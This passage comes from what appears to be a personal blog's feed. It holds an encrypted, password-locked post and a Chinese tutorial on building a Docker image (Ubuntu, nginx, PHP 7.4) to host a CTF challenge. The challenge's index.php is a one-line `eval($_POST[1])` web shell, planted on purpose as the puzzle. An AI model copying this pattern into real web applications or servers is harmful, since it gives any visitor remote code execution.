9204ad787cc8d74d2d22a01910b368b430db3337da40aff77349b7334775f46916bb71ca4b781c86ce6374b57ccd9495886622666f4f9bbd4bfca53d879069eac2e6680fe88a095ebcf87b8de67061984194512f6fe49d6514bdda1ce3a8707b6af3ad858cd7a99db255a95ae4027dc3ec953c48898770d800f41bf4ec5082b6b062ce1f8d9d435fb30d9265c989f441e1d3ff413088cd093d3cfc605892214b6a07419c286ea8a0d283a9891e7a87a46dec74bab850cd5c9a03007367e6a601c956a47e071743e86696af984ac0002566f192c4e6af1dde6e5b89f141ebf793764fd3c2f4001f92aabfe62decd4bc2cb5be537f2dc7966d0953592862c61e9245fa876ca58f1b8afa13856defdf26443ecace9642c1e8fa5739614c8f3972d38250bfd5155c7b0ebfaa9afe0ecc73cdee11486417a5fcdecfc8bd79eba6e1f3843e889d1c237169c0e97226bb21f94dd04eab7b8f635e6cc4e735db61725a5c1408f8c8ef94f5fe3ffb71d572eb23d6bfcbed693bee2ab261a8aff281435f855d7d8c693a8f45f54dba019e6c3be1bfaf45cbe5505937299436857019abd05713557730181a5c4d170b7cd66d183048e768cdc0ae3b3f5897f004444b5c75e765d9781bf1233b909f04b86deeddc563d6dd8d39c6c3c9150ec79b724cfc7374f53b1720fd516297c2729b86b07cc5071fcab1e8907486fc43be6609b1044572b14fd49435ad1b059a811c417bfd42f7a02f8423ae3fe5508a3103b0c81a5c2ba3ee5d228a4b333f48344de931bb2eb88ed186ff86ecb6be7f7e90596e5d9db38659508a4629467d3ebe40e7759ec3b654a25f6792e1818bc43732252d4b10d6d254c31e1513184d2be7871a2a916250f7ef74eef5a6e04606163904b89c9d0382aaaf3c5c4742b74cbd2546e2b90e0847d8e87f2ee317ac23b65f610327ecb52c21cccaefea54a8fea292eaedfbca6306f6b982c5c0cc018e502c72f79bd65c31294857a57ea1a302f9de5c47296d69b6d2967b3e0e244867bde02858d94117fa798e17f185fc9583c193ffa352a0bda9bca62f2bc201fef635119a220ad2b0c2d94d23860e5119d5f8f89919ff1428e4bd774040419e560f71e41d90f3490e20c50ebc51ddada9b32a342c4802df92576c74dd5d0eeefa6303fc419be0656984839c5e361c2654e770d7bf0773f225bef6ec4a35d73806cd8d126cadfab6c411fd12a5311d0a02f950858cd3c5effa1df6b22bb6533253ef5276e11843779e59c881c174422193183804d2793de2baf6670c76271c198f4c8f0822cef34a1200c6a78255f725c9e48d66dde26b1e6191d84a279bc7eea5f471c09c5a714cae6d4198fa147b786e6630f25bbde83ce46af9bf375f84b1f18feec4cc74107e5f8642ef516df15f5a0255148e044163ad81101371d2b9aff6a9b8413355e6b7ac68547b0dba72913e32dafaa0d8fc707bce3cb23d04dbe8b9a63a5908bba093132c0a0af037f231abefddd9683ab732fd19432f37a7b03d98f7edac45fe5864bb607312c19b02d8a7e96e5b943cc2ece76247de1b8770bb23082249742b2c048583a3c25beb43f1c63b377972da7f4861d2518895e33e6d1789febab2a052d41e4648b802a1c0323c7798196ba1f5b95b21e02b902ba1d2d964b6012821aa51c10714b47daf32f1c246f0fc7bc4076ff961afcf5849dbf7e8298ce5715e1504420843d08dbd1e11efc31b63842181e89d7d687a5dd9fb51dbb3a363534391bea98203c925b354ffded6b7d48e956fb5832f941f58006564dd604c4b9f1c4cfcb2b2254a70d03e24ee3c1ad0504217f4c4689df1be81b3c0219419d75c96f7e9155afad5c9f69de29e7ed5ac6ba26d10ae9b8bb65df4ad136d2966895d443776431f1c7869f2133eb4354a7da0593ee607b6b47e5e683fc82c74de54f923e41ac960f0f7e3a66943f8c20d5e9905b4d811291cc2fcacc5aefbf7ce2c04d5bd8342f0fa98dc55cf4a1a883702726cf9c1ed6d58e3d78673b06caae6c12ccb0ae3a09e8392f4c727ea05773e6b7148f572b089a01a9f23bc96a78aaec7559d6fbc7176ab162637dec74cbaa23a36feda9f332ca4b5b1146d95baa5fbf141256038bb4a7d3f7cc5f76f9aa311121946cebb0b81fa4055b8e93b5579c5d3db57ded6a7755eccf011cae7bfae60e60097b67bdb74a4a44bf7d87ef570201e445ea50faa0b5d7609b3ab94ecc7905ae509eab04f8cfbf7f5e2f49f0ef5c9626454f98113ac0284e1000fe7944745a8c11712e41898c118065998a316eeda18fe294cd5a3a1910683330737ee02e49abbd4cd7de9ed46c1e1c4fca4d353d57066c28b9f9f25fd9401cfc91b890aa2f873076254ee063f649009ab617a3676371dab3a6e52ef10e6014902981635c5ea0f216204e8c2d71bfe548488f4c9bf84244a202c426b2972fcbdb602536a1215bce4150c91d5cb0c0d29826bf5be2bd850110b0e50a8c4a358ff88461359c978a62164742c6528b051b9b0a518ee127d3d60873efce94c90bab960fc2cc7c46c54248be0dcee16b438bac0b8c77076770256d94d6bc4643b8ebb7d510ac0486798280e01c918b71b28582c9deea08c791015aed23cf2aabc8fa9c962bc7d5e670d4339c45c804bd132abfce8a3f25de72e311ea2af40fe1c9dab548036470dc8a5624b482edf8e6dd7914061ef26899ba5119325fce53ce438d4a5c7efd56f56c43138ee490179e33de520258cd12ee2b8aa957a299eddd385da12b160a67222f4b74d77695d0a68d9ea5f16de450cab827c47aadcc60f654b777f2fe7ca6046908e4b285b07a2d86cb13d32b6aa1c42caacb269da53d2cb3dc46ac9c159c187e667b95572c5ae0a4405c8f6ec76324f1104ec6f569128317408b126079ce1c3a61a0a8b7da7620ce10e5381a7b6d3919d5ea6f1f86405be3bcfbe566a996349833dc954369c6e5f895d99f5063d59554ba3f7ed5c5644df311c73e863b372fcc53a85ca11c3c0967862adec8ef3d6c885e9789853d859f67ecd4f88f73e79c8c6dc860ca5f5a8ed97614b892dcda422877d676eecbb9a9be1322b832ca9f41d6bf017b2f5964d7cc952720f19e27aa8075878b5a7b024824db745245297cb2cd740fa782c446dd439399ab3bfa2768a860cab93d0d91a16c54b4566a3e68c4ad0f0722d16ef5851b0c623f38791174541e52125ac32607161ff97f0f065267f717604262480afde311c61c2497160f91cdf9c4f4d5a62dc7aa41e8e40bdd33d8ae1c22628002dd47a66264596b5ef63e55ef7e1559800cb90f5c038d71b1e7ac38ae6e20cdeecbfecab888238c0e9d2b110bce461e0bf172081a1c2c6e66f35d16688f785bd6bf54b7f8bdfcc74cd8af8a05d0b9453cb97e9f1f2ea61c987d25c53e3d9d158f6a56f3b4ad6f95589ce13198eb168d1c639d054cce82fe3aa1cc833bb4ae15a2739f9b87490c5f5edad46999606c1006f62a0d16c99bbe1ee31092653fce2d0d88b5564d087b68122a33811edfa2f1f2026c43baa5dee2e48efed529f6db8790249794fc0fdcf6d41b6420b9e817c1d46fbab1af5e326108993a24cce57f2bf95e2d6a305278da124527a372d70ad4a366c4bfe3e527370ba97d1fb09a6d2ebb4f93a16378c02215a1c3d82b32d19dba7642b0be8b98dc38ab38a34a115378d7684e0c0ef237c917bba4b7441c11078589d6133f33a329e647bbff0d0f5d1c9a336fcd5a5c7b4cc2f508263918748a88c0137ee40cd46d6fe31eaa8f4667c9aa428b06e599e3bf2a24dc0c43fcb2396e8f1de5c4f8a1134c91e0ac72ca8ce8a1af87a20cb8e170941482e083533524ef59b26aac1086429f65cf44d9c0475d084364ffb2e02f1522767cda0f65565f1ee19f39822487e2f938dbff98b389433ba43ac7979dfd4cbf3ac29125af42bd666f5d84d87445cdd7bc324b6cea965864664109c2b108330edd58ee0ef4524d5b1167fc2c4eede43428a819b2788adae8549090d64dfa9577f71b9c86b5496575e8493d7f370d44aa3e27c4e47cf621f40b45f05aca61cd5c7335277b19f2d1b83a573661a7ff6d2e292cab6ed6dd8b03db2ef5ad0e3d7bfc0467129018d5c8ca5e7b95f8b3a0d97667140e328ffd14a03aa01fbccd230dcbef20863a477dbf40d104672976e34d667599c39099f733b82c9b3189f379b2500cb5396581f415a76c42535dfffb440ddd37cc1e6e303e439d4fe65a3044fddea4a850fa29decada88f64b1189b1d109fd052382ca67e7260c4eb7f968ef672abe440d5b71d6daabe304acf5723673adc4037937727a4c6e3e0624204ffdc98b01ea9f9bdcab57b090839194dbb01b2ff05496cb2cb4077884aaad234e6b1c91490812cdb501c121cb223cbd3cc94c7ee9718d6e13195ea63eee6b84187bb32a7b2cc985c06e1867017c305df815a7391e273fbaa674a793d23a27147bb671c801d634f1758d63c7e88009f5a467e2775ec725063902f1441cefd5a7d29b4c2da345675a69c2a5546b2e87b022581eefa490e3267fc82bc41b8cfc019687354183f6b3dac905b4037b7517bfec6beb900e6668e1643c70a2d7547ffb42f841d421cba88d52b9d4fa5fbeaa72076ef6fe912ca5a01884330f264c1c000de635d3364abe42b1cf744f81c182784d9c7897dcbe53e15723c6a488317d231478fd770cfbede7fb67fb14f7b4bcf7e2cb8bceb14f0a7e1a40b4bf1645fa2088983b05d61776c67e9cbd709bf4dc3bbdde6abe135257eec282172c92e9aaebf929c073e4b7964bdc7ee7bfeeb434011d8ca097dd8978ded783bc3bca6e68a354e4028dc4c0ab63b3b3cd9c86733acdcaf2812011d5bc2a3ad03a3ce00f7469758d2da512549518f0f881dfa3e5ad64b3dbe3912d83c9c1cd034137a0ea3f7893268c8f4b2bb1aab093d963d9ded29bea739419526cda64198a9cd0d19e1f17ac9cd53925348b2bfa14d522537e09fb753b5c13d1fb98d69eecc6e2a191efd95faee8a5e81a52617e17977a3e77d2c812d19855a1095b2f7addfba2323b723715b7f0e7ac1823dfe38938cb0db94719e00891c48e0668943701cb25e905c7de311716e8ec51484628b8573f2c99d7c2bdf20c431754851fb1a515364cca2aaaeae8e43256d77ba85fcfd3d98cea3299fc50204a9cf3371a367d962a573e94fa416e19efc92d841f69fed7a3c4ccafd04016e43f356df1dcfa5ca1a08964e57dfe7d79018d07cdb97f7d730fa8839dedd193f3ca319581ed3ef436ed0d231a2785a84f8ef07708a27418af618c882e241ba6a89018f0671d0571354a65fd430ba1004fceeff07dd09bc6483de2bed38c3fc1ceace44ca0b7a704b54c9755a2b3e6bf7bd42cb7142bb78bbfd72d8f828ad586862c1af8f3c5e163bf3c05d507f8e1d9e8ca6f684f1cc3f0df25e46ce1992c5d0d5956f2079999aa25ee26c8d7553ffa2c03d5157f507587bd5a576cb562c75bd4b4d7fa5ef744e26fc12bcba05739b59ea7d275748533116e6ae9c5147bf6d3dac59287998000601cb07ba09ece57f26a4f341098c3dff0359144c5e2e678a79de6dd3f36a8a898e48e20c097abae3eb6faff4badc76381696ab292e48f24f6f75a873bf6c57db8f1f1a21e15cc245ccbeb61462964e538bf7ae9196bfb54326ac425a7ebb5343d9b5fdee4e8215ec0deb9bb82a980db6378c8b72150ec051785b546549aac0fe325edd1f8719fb0a2d194bec61e61aadccb974227ff20602ef1a324268f9f5ffc5caae99222bc29c928040c00684900cec782031d2f4d014908d087245cf8fbbefa556a56b07bcafe3f30f08341b3b083ba1a978c90367e29cc94ddbc0aac4a20f7445e3bae01dc2a4e98c6774db2f368630a2e4b1b0c9d53453f32f5b45ce85705a949a175eab0fa9ac50bb2551032a82777be9b72daa06112cd79ca5db2d403771a2b48d06aa0d5e6fcd35c2f95d7c0290bce8571c3e641a02f1ea90e26502dbccf546dc41a9ebf03000ded34862ca681d1e21d0d05b94a02980f0ecd602e2ae752956fd1d91877896965f00da0b389e55eb6e56001ab4d97295efbf895af163e944497da9c54478658e2669358172ba183356f9719c1a6699515d7289befc0fd5876fa553451d4fd0af9640cac1a9e9b93add73762f20a5d2ecef5fd5710a1eb2fb928f0ecf08cf03e5196595212277c9fb8a28d187127034d67da4caeea7d96474eb6102d2a5aa260aa5a67443c90410b60d5f5656db3b295d7a6c3d2729d0dfc55aa554a44a874667e3e60817ae031d19ff8a19375ea110e6691e36351fabd66b610f15bff789879d3f4d29ca08dcdcf69730b2c8f6db3786247e1b6d73591d5d3cbd2e57fb0c2da441cef4bcaf179e7318ea57fdbe254c60f986ca8ad469d389dfe9039e5a1ee2ee0e7757d7e207f69d02b505d308dcb792cc29e522e15e76dddc472b3cf02ab50159c06a484d4bf91a564c26ee1138132b5fd69d32c14519a6ac859ef90a21a05f615bd0e0ccd25012bfdc02d62a27b163e6111135184ac162c63fcae7a847c8a893e65706954b4bb774c7f208c588fb7d085fa8d9f9438bd7518df9ba417a8efcb945749d03e318ffec95d6d718548fb0bc56d3ac289d7e86a0b6500cc4ab2ebacc22ce0ace50a3454aa085846d64b22cf8a64391a50aee6e8c5ecba99d8c9c561d6096e1925f008680a8d3dfbd1227e27d18d2f397264ae0055f1c5c21f76296565c33366b560fedb9580a6a0c679c976b4b3cef320d78f0edfc38d70bfc00bb6486c76ea7af082ebaa8cd2eeeef906e9537eb8f2cb01d942821c8dc938360fae9a4816117c2807cf28bc78ca08eb0badf11ee30b00f8604614bf0f496c39c8c06eae3049169e925402a7b9dbe545910dd44a446b5c58fc0ef08f4a68d8e56f9021d849a693a8ff3de0ad432f15141dd7ebc1650508164aea8ad1150d44dd1b39f81cae186044d28b2282a8ed739e6f88b97cc8d3d6edfca2c609aedd2af6fdd497988f44529b454372bb1ae84a01477ae9e2d5db85e66e916a90850f3a58d07c7a33427f64876be26e13f41afc0b69a3747d0c2c7d98e2eccc25e45664b30a94a157d9c4d0a58e3143fd49d7ee1d9ea2c86bb23268f983ff21b5bd6620b785c9a579a62f09bf68ee38ec6b3641d44e8949b5f999d6179ca5e2517ae3c3baf3b9e9f2c4e6a93fb100d7333aed61a193cb345a940cfa7fc8b0c8403d87980fc387c1d59a4b072f94fae0376ee038b5ebd1a55e7aa964840de1c0621c2b1b3707c446b8f3c77d7a91e23885f06357660502aa0ad6679c293e124b00c16cd513648d1c67e01e543414d8abe72513706c35ea4fe60b269141485f5c600795fa18d1af3c2d24af1662a5d4bc8ba9cd7c1915491d7986f8f464292fa350ba0dfa0a64e2d3dea24f81e77b6a1ce336becaa5916db6676d202a0dffea0672cf06b6a44c4d1a98e237d3d85e4761cf193a2f89db8ba8b9e392ed947e6afce8a4501f9871c1c2dac4be466617b419e86b28bb3ebbd18290fd54abce74e9ae857ad647fc673a76a88c24e101c3d6337d8728a20cd94b2b09ea4950c2b49d9dc850996ef4fec1ea60fcc8c76be486cba46227b1f77b009bfcec809314bd9ad57aa6d578cf5a592c3e01162708d48e2a888c7fe39a5b83e75736c586fa9b8761c96db1e3b731d799f575dfab71de08edd7a1f9b654d56a290ff1b73aed3aa60088808552353803aa0c41a8de3b38fd69db6d13ae76a25b4d1c8b7a888513cd89e00d591ea24736f379e3e0b372145bfda8c31729f7e441bfba2803037b5b7f529cf419f78c66df11a11f8a7041de0aa93da8322839e4649f9abf0d32ea55a08a82f56ff8570613eb65dfc75f865a04cd3973e20ce4938083cb99919d589f2691bca41d7dfab1166bc5ab5c73edefaf9d0e1aa20102b5a531e883c23a7e0db547c1cc2c3c0ed973eb0475beb3d4c439b4622f58eb37b755d414ea7399b3d49333c82e9d693f2ba850e19da849a871f132937752e3fa1e98dc60d6a9958df3085f8ecaad682e868446a627f468eb9468930ed26b4cbd2730ea3c03ed266a5d2d3555b4cb</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这是一篇加密文章，需要密码才能继续阅读。</summary>
    
    
    
    
    <category term="show-Nodejs污染" scheme="https://ke1nys.github.io/tags/show-Nodejs%E6%B1%A1%E6%9F%93/"/>
    
  </entry>
  
  <entry>
    <title>Docker-学习</title>
    <link href="https://ke1nys.github.io/posts/75581288.html"/>
    <id>https://ke1nys.github.io/posts/75581288.html</id>
    <published>2023-07-31T03:16:07.000Z</published>
    <updated>2023-08-17T09:33:39.338Z</updated>
    
    <content type="html"><![CDATA[<p>这里写这个的话主要是为了记录这个<strong>学习<code>docker</code>的过程</strong></p><p><a href="https://blog.csdn.net/YBaog/article/details/125349766">参考文章1</a></p><p><a href="https://www.zeker.top/posts/f7e6aba0/#%E4%BA%94%E3%80%81Docker-compose">参考文章2</a></p><p><strong>docker安装方式自行google 很快就能安装好了</strong></p><p>(<strong>之前只是简单的了解了一下docker  没咋用过 现在开始学习后才发现docker的强大</strong>)</p><ul><li>ubuntu </li><li>nginx </li><li>php7.4-fpm</li></ul><p>以上就是要用到地东西</p><h3 id="拉取ubuntu镜像"><a href="#拉取ubuntu镜像" class="headerlink" title="拉取ubuntu镜像"></a>拉取ubuntu镜像</h3><p><code>docker pull ubuntu</code>    (不指定版本地话都是拉取最新的版本)</p><p>或者在Docker-desktop  里面搜索下载也是可以的</p><p><img src="../images/image-20230731141029597.png" alt="image-20230731141029597"></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="language-bash"> -it -p 8080:80 --name=ctf ubuntu(镜像ID)</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exit   //是退出</span><br></pre></td></tr></table></figure><p>启动一个已停止的容器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start b750bbbcfd88 (镜像ID)</span><br></pre></td></tr></table></figure><p>进入容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker attach b750bbbcfd88 (镜像ID)</span><br><span class="line">或者</span><br><span class="line">docker exec -it b750bbbcfd88 /bin/bash</span><br></pre></td></tr></table></figure><h3 id="安装nginx"><a href="#安装nginx" class="headerlink" title="安装nginx"></a>安装nginx</h3><p>这里的话直接是在<code>Ubuntu</code>里进行安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install -y nginx    //-y  是全部默认的意思</span><br></pre></td></tr></table></figure><p><strong><code>nginx</code>命令</strong></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 关闭</span></span><br><span class="line"><span class="attribute">service</span> nginx stop</span><br><span class="line"><span class="comment"># 开启</span></span><br><span class="line">service nginx start</span><br><span class="line"><span class="comment"># 状态</span></span><br><span class="line">service nginx status</span><br><span class="line"><span class="comment"># 重启</span></span><br><span class="line">service nginx restart</span><br></pre></td></tr></table></figure><h3 id="安装php"><a href="#安装php" class="headerlink" title="安装php"></a>安装php</h3><p>这里我选择的是<code>php7.4</code>版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y software-properties-common</span><br><span class="line"></span><br><span class="line">add-apt-repository ppa:ondrej/php</span><br><span class="line"># 出现暂停，按回车键[ENTER]</span><br><span class="line"></span><br><span class="line">apt-get update</span><br><span class="line"></span><br><span class="line">apt-get install -y php7.4-fpm</span><br><span class="line"># 必须得是按照顺序来</span><br></pre></td></tr></table></figure><p>php7.4-fpm-命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 关闭</span><br><span class="line">service php7.4-fpm stop</span><br><span class="line"># 开启</span><br><span class="line">service php7.4-fpm start</span><br><span class="line"># 状态</span><br><span class="line">service php7.4-fpm status</span><br><span class="line"># 重启</span><br><span class="line">service php7.4-fpm restart</span><br></pre></td></tr></table></figure><h3 id="安装Vim"><a href="#安装Vim" class="headerlink" title="安装Vim"></a>安装Vim</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install -y vim</span><br></pre></td></tr></table></figure><h3 id="环境配置与搭建"><a href="#环境配置与搭建" class="headerlink" title="环境配置与搭建"></a>环境配置与搭建</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/nginx/sites-available/default</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230731142244821.png" alt="image-20230731142244821"></p><p>添加<code>index.php</code> 并且把下面指定的代码取消注释</p><h4 id="启动nginx和php服务"><a href="#启动nginx和php服务" class="headerlink" title="启动nginx和php服务"></a>启动nginx和php服务</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 检查 nginx 配置文件</span><br><span class="line">nginx -t</span><br><span class="line"># 重启 nginx</span><br><span class="line">service nginx restart </span><br><span class="line"># 启动 php7.4-fpm</span><br><span class="line">service php7.4-fpm start </span><br></pre></td></tr></table></figure><p>这里的<code>nginx -t</code> 可以用来检查修改的配置是否修改正确  如果修改错误的话会报错提醒</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 查看当前进程</span><br><span class="line">ps -aux</span><br><span class="line"># 查看 nginx 状态</span><br><span class="line">service nginx status </span><br><span class="line"># 查看 php7.4-fpm 状态</span><br><span class="line">service php7.4-fpm status </span><br></pre></td></tr></table></figure><p><strong>检查这个<code>nginx</code>和<code>php</code>服务的运行状态</strong></p><p>然后去访问一下开放的端口   看<code>nginx</code>是否在正常运行</p><p><img src="../images/image-20230731143616100.png" alt="image-20230731143616100"></p><p>那么我们就去修改该目录下的文件  让其显示我们想要显示的内容</p><p>(<strong>将该html文件删除</strong>)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /var/www/html/index.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">eval($_POST[1]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>将上述内容写入   然后去访问</p><p><img src="../images/image-20230731143820087.png" alt="image-20230731143820087"></p><p>成功写入    </p><p><strong>(假如这是我们要出的题目   那么我们就可以尝试去将其变成镜像  方便部署)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker build -t ctf:v1 .   </span><br><span class="line">// .的意思是把当前目录下的文件都给打包</span><br><span class="line">// -t 后面是跟着镜像名字  :后面是标签   都可以自己定义</span><br></pre></td></tr></table></figure><p>在构造镜像之前 我们要编写<code>Dockerfile</code></p><p>(<strong>它的作用是能帮助我们起容器</strong>)</p><h4 id="编写Dockerfile和docker-compose-yml"><a href="#编写Dockerfile和docker-compose-yml" class="headerlink" title="编写Dockerfile和docker-compose.yml"></a>编写Dockerfile和docker-compose.yml</h4><p>写这个的目的就是为了能帮助我们<strong>自动化部署环境</strong></p><p><strong>(例如就是自动安装<code>nginx</code>和<code>php</code>等等之类的工作)</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu</span><br><span class="line"></span><br><span class="line"><span class="keyword">LABEL</span><span class="language-bash"> Author=<span class="string">&quot;Ke1nys&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">#更新软件源</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#安装nginx</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt install nginx -y</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#安装php7.4-fpm</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y software-properties-common</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> add-apt-repository ppa:ondrej/php -y</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y php7.4-fpm</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#删除nginx默认html文件</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">rm</span> /var/www/html/index.nginx-debian.html</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#将题目源码复制过去</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./src/index.php /var/www/html/</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./src/f1ag /</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./src/default /etc/nginx/sites-available/default</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 755 /var/www/html/ &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chown</span> -R root:root /var/www/html </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#启用脚本</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./run.sh /root/run.sh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash">  <span class="built_in">chmod</span> +x /root/run.sh</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;/root/run.sh&quot;</span>]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8080</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面注释都写的很清楚了</p><p>接着写一个<code>sh</code>文件来帮我们自动化开启<code>nginx</code>和<code>php</code></p><p><strong>run.sh</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#启动nginx</span></span><br><span class="line">service nginx start</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动php</span></span><br><span class="line">service php7.4-fpm start</span><br><span class="line"></span><br><span class="line"><span class="comment"># # never exit，此处是为了运行完上条应用服务后，有对应的前台进程</span></span><br><span class="line"><span class="built_in">tail</span> -f /dev/null</span><br></pre></td></tr></table></figure><p>注释也是解释的很清楚了</p><p><strong><code>docker-compose.yml</code></strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 指定该文件版本</span></span><br><span class="line">version: <span class="string">&#x27;3&#x27;</span></span><br><span class="line"><span class="comment"># 把每个子目录视为一个镜像，开始构建</span></span><br><span class="line">services:</span><br><span class="line">  src: <span class="comment">#这个是文件目录名</span></span><br><span class="line">    <span class="comment"># 此处仅允许 image, build, ports，禁止其他字段出现，如果有 volume，cmd 等设置需求，请在 Dockerfile 里进行文件拷贝或者申明。</span></span><br><span class="line">    image: ctf/test1        <span class="comment">#镜像名字</span></span><br><span class="line">    build: ./           <span class="comment">#build的位置，docker会去web1中的dockerfile开始搭建</span></span><br><span class="line">    <span class="comment"># restart: always</span></span><br><span class="line">    ports:</span><br><span class="line">      - <span class="string">&quot;8080:80&quot;</span>           <span class="comment">#设置映射的断口</span></span><br><span class="line">    environment:</span><br><span class="line">      - FLAG=flag&#123;this_is_test_flag&#125;                      <span class="comment"># 这里定义了flag,但是不会覆盖sh里的$FLAG</span></span><br><span class="line">    <span class="comment">#   - FLAG=flag&#123;$(cat /proc/sys/kernel/random/uuid)&#125;  # 获取容器的uuid作为flag 会报错</span></span><br></pre></td></tr></table></figure><p>注释也是写的很清楚了</p><p><code>dockerfile</code>和<code>docker-compose.yml</code>   要与这个源码里的文件名对应上  